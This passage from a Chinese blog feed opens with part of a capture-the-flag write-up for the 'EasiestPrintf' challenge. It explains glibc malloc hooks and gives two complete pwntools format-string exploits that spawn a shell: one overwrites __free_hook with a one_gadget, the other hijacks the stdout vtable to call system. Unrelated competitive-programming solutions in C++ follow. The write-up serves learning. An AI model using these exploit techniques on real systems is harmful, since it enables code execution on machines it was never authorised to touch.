<p><strong>事实上，题目给出的<code>libc</code>的版本是早于<code>libc.2.23.so</code>的，所以存在<code>*0x3E297</code>这样一个<code>execve(&#39;/bin/sh&#39;)</code>，在之后版本的<code>libc</code>中全部都吧<code>/bin/sh</code>给去掉了</strong></p>
<blockquote>
<p>在GNU C库中，可以通过指定合适的钩子函数，来修改<code>malloc</code>、<code>relloc</code>、<code>free</code>的行为，通过使用这些钩子，可以帮助我们对动态的内存分配进行调试。 在<code>malloc.h</code>中定义了以下钩子变量：<br><code>__malloc_hook</code><br>该变量是<code>malloc</code>被调用时所使用的函数的指针，类型为<code>void *function (size_t size, const void *caller)</code>，<code>caller</code>的值表示<code>malloc</code>被调用时在栈上的返回地址，该值可以用来跟踪程序的内存消耗情况。<br><code>__realloc_hook</code><br>与<code>__malloc_hook</code>类似，该变量是realloc被调用时所使用的函数的指针，类型为<code>void *function (void *ptr, size_t size, const void *caller)</code><br><code>__free_hook</code><br>该变量是free被调用时所使用的函数的指针，类型为<code>void function (void *ptr, const void *caller)</code><br><code>__memalign_hook</code><br>该变量是<code>aligned_alloc</code>,<code>memalign</code>, <code>posix_memalign</code>和<code>valloc</code>所使用的函数的指针，类型为<code>void *function (size_t alignment, size_t size, const void *caller)</code><br><code>__malloc_initialize_hook</code><br>该变量是初始化malloc系列函数的函数指针，该函数仅被调用一次。 如：<br><code>void (*__malloc_initialize_hook) (void) = my_init_hook;</code></p>
<p>这些钩子函数在较新版本的gcc中已经被废弃了。 那么还有别的办法吗？ 注入<code>malloc/realloc/free</code>调试函数的一个可行的方式是采用自己的库来<code>export</code>这些函数，C链接规则是明确按顺序来的，因此如果两个库提供了相同的函数，第一个指定的将被使用。 在unix系统上，则可以使用<code>LD_PRELOAD</code>机制在加载时注入自己的<code>malloc</code>函数。 </p>
</blockquote>
<p>最终的exp<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">from pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'critical'</span></div><div class="line"></div><div class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</div><div class="line">elf = ELF(<span class="string">'./EasiestPrintf'</span>)</div><div class="line"></div><div class="line">read_got = elf.symbols[<span class="string">'_GLOBAL_OFFSET_TABLE_'</span>] + <span class="number">12</span></div><div class="line">libc.symbols[<span class="string">'one_gadget'</span>] = <span class="number">0x3E297</span></div><div class="line"></div><div class="line">p = process(<span class="string">'./EasiestPrintf'</span>)</div><div class="line"></div><div class="line">def exec_fmt(payload):</div><div class="line">    p = elf.process(env = &#123;<span class="string">'LD_PRELOAD'</span>: libc.path&#125;)</div><div class="line">    p.sendline(<span class="built_in">str</span>(read_got))</div><div class="line">    p.recvuntil(<span class="string">'Good Bye\n'</span>)</div><div class="line">    p.sendline(payload)</div><div class="line">    <span class="keyword">return</span> p.recvall()</div><div class="line"></div><div class="line">fmt = FmtStr(exec_fmt)</div><div class="line"><span class="built_in">log</span>.critical(<span class="string">'offset: '</span> + <span class="built_in">str</span>(fmt.offset))</div><div class="line"></div><div class="line">p = process(<span class="string">'./EasiestPrintf'</span>)</div><div class="line"><span class="built_in">print</span> p.recvline()</div><div class="line"></div><div class="line">p.sendline(<span class="built_in">str</span>(read_got))</div><div class="line">data = p.recvline()</div><div class="line"><span class="built_in">print</span> data</div><div class="line">read_addr = <span class="built_in">int</span>(data, <span class="number">16</span>)</div><div class="line">libc.address = read_addr - libc.symbols[<span class="string">'read'</span>]</div><div class="line"><span class="built_in">log</span>.critical(<span class="string">'libc_base : '</span>, <span class="built_in">hex</span>(libc.address))</div><div class="line"></div><div class="line"><span class="built_in">print</span> p.recvline()</div><div class="line">p.sendline(fmtstr_payload(fmt.offset, &#123;libc.symbols[<span class="string">'__free_hook'</span>]: libc.symbols[<span class="string">'one_gadget'</span>]&#125;) + <span class="string">'%100000c'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<h3 id="第二个思路"><a href="#第二个思路" class="headerlink" title="第二个思路"></a>第二个思路</h3><blockquote>
<p>程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接<code>exi</code>t。在程序启用<code>Full RELRO</code>的情况下，选择覆盖<code>libc</code>中的<code>_IO_2_1_stdout_</code>结构的虚表，因为<code>printf</code>在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为<code>system</code>，而这个结构自身会作为参数传入，覆盖虚表之后将一个<code>sh\0\0</code>写到整个结构头部即可。</p>
</blockquote>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./EasiestPrintf'</span>)</div><div class="line"></div><div class="line">addr_stdout = <span class="number">0x0804a044</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="symbol">DEBUG:</span></div><div class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</div><div class="line">    p = process(<span class="string">'./EasiestPrintf'</span>)</div><div class="line">    context(log_level = <span class="string">'critical'</span>)</div><div class="line"><span class="symbol">else:</span></div><div class="line">    <span class="comment"># p = remote('202.120.7.210', 12321)</span></div><div class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeio</span><span class="params">()</span></span>:</div><div class="line">    <span class="keyword">return</span> remote(<span class="string">'202.120.7.210'</span>, <span class="number">12321</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_addr</span><span class="params">(addr)</span></span>:</div><div class="line">    p.recvuntil(<span class="string">'read:\n'</span>)</div><div class="line">    p.sendline(str(addr))</div><div class="line">    addr = p.recvuntil(<span class="string">'\n'</span>)[<span class="symbol">:-</span><span class="number">1</span>]</div><div class="line">    addr = int(addr, <span class="number">16</span>)</div><div class="line">    print <span class="string">'stdout =&gt;'</span>, hex(addr)</div><div class="line">    <span class="keyword">return</span> addr</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span>:</div><div class="line">    stdout_addr = get_addr(addr_stdout)</div><div class="line">    libc.address = stdout_addr - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</div><div class="line">    system_addr = libc.symbols[<span class="string">'system'</span>]</div><div class="line">    stdout_vtable_addr = stdout_addr + <span class="number">0x94</span></div><div class="line">    str_sh = u32(<span class="string">'sh\x00\x00'</span>)</div><div class="line">    x1 = system_addr</div><div class="line">    x1_hi, x1_lo = x1 <span class="meta">&gt;&gt; </span><span class="number">16</span>, x1 &amp; <span class="number">0xFFFF</span></div><div class="line">    x2 = stdout_addr - <span class="number">4</span> - <span class="number">0x1c</span></div><div class="line">    x2_hi, x2_lo = x2 <span class="meta">&gt;&gt; </span><span class="number">16</span>, x2 &amp; <span class="number">0xFFFF</span></div><div class="line"> </div><div class="line">    print p.recvuntil(<span class="string">'Good Bye\n'</span>)</div><div class="line"></div><div class="line">    <span class="comment"># libc_stdout = 'sh\x00\x00'</span></div><div class="line">    <span class="comment"># libc_stdout-4 = &amp;system</span></div><div class="line">    <span class="comment"># libc_stdout_vtable+0x1c = &amp;(libc_stdout-4)</span></div><div class="line">    buf = p32(stdout_addr) + p32(stdout_addr-<span class="number">4</span>) + p32(stdout_addr-<span class="number">2</span>) + p32(stdout_vtable_addr)</div><div class="line">    buf += <span class="string">'%'</span> + str(str_sh-<span class="number">16</span>) + <span class="string">'c%7$n'</span></div><div class="line">    buf += <span class="string">'%'</span> + str(<span class="number">0x10000</span>+x1_lo-str_sh) + <span class="string">'c%8$hn'</span></div><div class="line">    buf += <span class="string">'%'</span> + str(<span class="number">0x10000</span>+x1_hi-x1_lo) + <span class="string">'c%9$hn'</span></div><div class="line">    buf += <span class="string">'%'</span> + str(<span class="number">0x10000</span>+x2_lo-x1_hi) + <span class="string">'c%10$hn'</span></div><div class="line"></div><div class="line">    p.sendline(buf)</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;EasiestPrintf&quot;&gt;&lt;a href=&quot;#EasiestPrintf&quot; class=&quot;headerlink&quot; title=&quot;EasiestPrintf&quot;&gt;&lt;/a&gt;EasiestPrintf&lt;/h2&gt;&lt;p&gt;简单的程序，但是始终找不到利用方法。看了wp，给大佬
    
    </summary>
    
    
      <category term="PWN" scheme="http://reehy.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>GPLT 2017</title>
    <link href="http://reehy.top/2017/03/27/GPLT-2017/"/>
    <id>http://reehy.top/2017/03/27/GPLT-2017/</id>
    <published>2017-03-27T07:14:42.000Z</published>
    <updated>2017-03-27T08:06:09.812Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>这次连200分都没到，感觉平时做是能到的，还是太菜了。下面把没做完的题目做了吧，感觉有些方法挺暴力的。。<br>好几个点都没拿到满分。。就酱吧</p>
<h3 id="L2-020-功夫传人"><a href="#L2-020-功夫传人" class="headerlink" title="L2-020. 功夫传人"></a>L2-020. 功夫传人</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxN = <span class="number">1e5</span> + <span class="number">10</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> v[maxN] = &#123;<span class="number">0</span>&#125;;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">double</span> z, r;</div><div class="line"><span class="keyword">int</span> s[maxN] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">double</span> sum;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%lf%lf"</span>, &amp;n, &amp;z, &amp;r);</div><div class="line">	r = <span class="number">1</span> - r / <span class="number">100</span>;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">int</span> x, y;</div><div class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</div><div class="line">		<span class="keyword">if</span> (x != <span class="number">0</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; x; j++)</div><div class="line">			&#123;</div><div class="line">				<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;y);</div><div class="line">				s[y] = i;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">else</span></div><div class="line">		&#123;</div><div class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;y);</div><div class="line">			v[i] = y;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span> (v[i] != <span class="number">0</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">int</span> front = s[i];</div><div class="line">			<span class="keyword">double</span> ans = z * r;</div><div class="line">			<span class="keyword">while</span> (front)</div><div class="line">			&#123;</div><div class="line">				ans *= r;</div><div class="line">				front = s[front];</div><div class="line">			&#125;</div><div class="line">			sum += ans * v[i];</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%ld\n"</span>, (LL)sum);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="L3-013-非常弹的球"><a href="#L3-013-非常弹的球" class="headerlink" title="L3-013. 非常弹的球"></a>L3-013. 非常弹的球</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">float</span> g = <span class="number">9.8</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> w;</div><div class="line"><span class="keyword">int</span> p;</div><div class="line"><span class="keyword">float</span> ans;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;w, &amp;p);</div><div class="line">	<span class="keyword">float</span> q = (<span class="keyword">float</span>)p / <span class="number">100.0</span>;</div><div class="line">	ans = (<span class="number">200000.0</span> / <span class="number">9.8</span>) / (<span class="keyword">float</span>)w / q;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%.3f\n"</span>, ans);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h2&gt;&lt;p&gt;这次连200分都没到，感觉平时做是能到的，还是太菜了。下面把没做完的题目做了吧，感觉有些方法挺暴力的
    
    </summary>
    
    
      <category term="GPLT" scheme="http://reehy.top/tags/GPLT/"/>
    
  </entry>
  
  <entry>
    <title>UVa 11572</title>
    <link href="http://reehy.top/2017/03/24/UVa-11572/"/>
    <id>http://reehy.top/2017/03/24/UVa-11572/</id>
    <published>2017-03-24T05:36:17.000Z</published>
    <updated>2017-03-24T05:39:07.221Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>Emily the entrepreneur has a cool business idea: packaging and selling snowflakes. She has devised a<br>machine that captures snowflakes as they fall, and serializes them into a stream of snowflakes that flow,<br>one by one, into a package. Once the package is full, it is closed and shipped to be sold.<br>The marketing motto for the company is “bags of uniqueness.” To live up to the motto, every<br>snowflake in a package must be different from the others. Unfortunately, this is easier said than done,<br>because in reality, many of the snowflakes flowing through the machine are identical. Emily would like<br>to know the size of the largest possible package of unique snowflakes that can be created. The machine<br>can start filling the package at any time, but once it starts, all snowflakes flowing from the machine<br>must go into the package until the package is completed and sealed. The package can be completed<br>and sealed before all of the snowflakes have flowed out of the machine.<br>Input<br>The first line of input contains one integer specifying the number of test cases to follow. Each test<br>case begins with a line containing an integer n, the number of snowflakes processed by the machine.<br>The following n lines each contain an integer (in the range 0 to 109<br>, inclusive) uniquely identifying a<br>snowflake. Two snowflakes are identified by the same integer if and only if they are identical.<br>The input will contain no more than one million total snowflakes.<br>Output<br>For each test case output a line containing single integer, the maximum number of unique snowflakes<br>that can be in a package.<br>Sample Input<br>1<br>5<br>1<br>2<br>3<br>2<br>1<br>Sample Output<br>3</p>
</blockquote>
<p>最后写来写去，写成了树上的样子。。<br>滑动窗口的简单实例</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxN = <span class="number">1e7</span> + <span class="number">10</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n, m;</div><div class="line"><span class="keyword">int</span> a[maxN];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">	<span class="keyword">while</span> (n--)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;m);</div><div class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</div><div class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a[i]);</div><div class="line">		<span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; s;</div><div class="line">		<span class="keyword">int</span> L = <span class="number">0</span>, R = <span class="number">0</span>, ans = <span class="number">0</span>;</div><div class="line">		<span class="keyword">while</span> (R &lt; m)</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">while</span> (R &lt; m &amp;&amp; !s.count(a[R]))</div><div class="line">				s.insert(a[R++]);</div><div class="line">			ans = max(ans, R - L);</div><div class="line">			s.erase(a[L++]);</div><div class="line">		&#125;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Emily the entrepreneu
    
    </summary>
    
    
      <category term="UVa" scheme="http://reehy.top/tags/UVa/"/>
    
      <category term="滑动窗口" scheme="http://reehy.top/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    
  </entry>
  
</feed>
